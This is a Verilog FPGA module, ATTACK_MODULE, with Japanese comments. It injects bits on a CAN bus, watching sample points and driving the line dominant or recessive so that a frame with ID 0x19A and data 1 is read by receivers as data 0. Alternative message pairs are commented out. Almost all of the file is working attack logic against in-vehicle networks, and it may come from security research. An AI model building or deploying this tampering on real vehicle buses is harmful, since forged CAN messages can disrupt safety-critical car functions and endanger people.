`timescale 1ns / 1ps
//////////////////////////////////////////////////////////////////////////////////
// Company: 
// Engineer: 
// 
// Create Date: 2019/12/21 13:21:28
// Design Name: 
// Module Name: ATTACK_MODULE
// Project Name: 
// Target Devices: 
// Tool Versions: 
// Description: 
// 
// Dependencies: 
// 
// Revision:
// Revision 0.01 - File Created
// Additional Comments:
// 
//////////////////////////////////////////////////////////////////////////////////


module ATTACK_MODULE(
    clk,
    rst,
    can_signal_in,
    state,
    attack_state,
    sample_point,
    sample_point_q,
    to_dominant,
    to_recessive
);

    input clk;
    input rst;
    input can_signal_in;
    input state;
    input attack_state;
    input sample_point;
    input sample_point_q;
    output to_dominant;
    output to_recessive;

    parameter UNATTACKED_MSG = 44'b00011001101000001001000001001110000101010110;    //ID:19A,DATA:1のメッセージ
    parameter ATTACKED_MSG =   44'b00011001101000001001000001000010010011001111;  //ID:19A,DATA:0のメッセージ
//    parameter UNATTACKED_MSG =  44'b00011001101000001001000001000010010011001111;   //ID:19A,DATA:0のメッセージ
//    parameter ATTACKED_MSG =    44'b00011001101000001001000001001110000101010110;  //ID:19A,DATA:1のメッセージ
//    parameter UNATTACKED_MSG = 48'b000001111011100000101000001001101111101011000110;    //ID:077,DATA:01のメッセージ
//    parameter ATTACKED_MSG =   48'b000001111011100000101000001010101010010000011110;  //ID:077,DATA:02のメッセージ
//    parameter ATTACKED_MSG =   48'b000001111011100000101000001101000011101111101010;  //ID:077,DATA:05のメッセージ
//    parameter UNATTACKED_MSG = 47'b00000111101110000010100000101100100010001101010;    //ID:077,DATA:03のメッセージ
//    parameter ATTACKED_MSG =   47'b00000111101110000010100000110010000101110011110;  //ID:077,DATA:04のメッセージ
    parameter MSG_L = 8'd44;
    
    reg [7:0] bit_cnt;
    reg [7:0] attack_cnt; //クロック16MHzだと1カウント6.25ns,20カウントで1Tq
    reg ex_attack;
    wire attack_bit; //攻撃bit
    
    assign attack_bit = UNATTACKED_MSG[MSG_L - 1 - bit_cnt] != ATTACKED_MSG[MSG_L - 1 - bit_cnt];
    assign to_dominant = ~(ex_attack && UNATTACKED_MSG[MSG_L - 1 - bit_cnt] == 1);
    assign to_recessive = ~(ex_attack && UNATTACKED_MSG[MSG_L - 1 - bit_cnt] == 0);
    
    always @(posedge clk) begin
        if(~rst) begin
            bit_cnt <= 0;
        end else if(~state) begin
            bit_cnt <= 0;
        end else if(sample_point) begin
            bit_cnt <= bit_cnt + 1;
        end
    end
    
    always @(posedge clk) begin
        if(~rst) begin
            attack_cnt <= 0;
        end else if(ex_attack) begin
            attack_cnt <= attack_cnt + 1;
        end else begin
            attack_cnt <= 0;
        end
    end
    
    always @(posedge clk) begin
        if(~rst) begin
            ex_attack <= 0;
        end else if(attack_bit && sample_point_q) begin
            ex_attack <= 1;
        end else if(attack_cnt == 8'd40) begin
            ex_attack <= 0;
        end
    end

endmodule
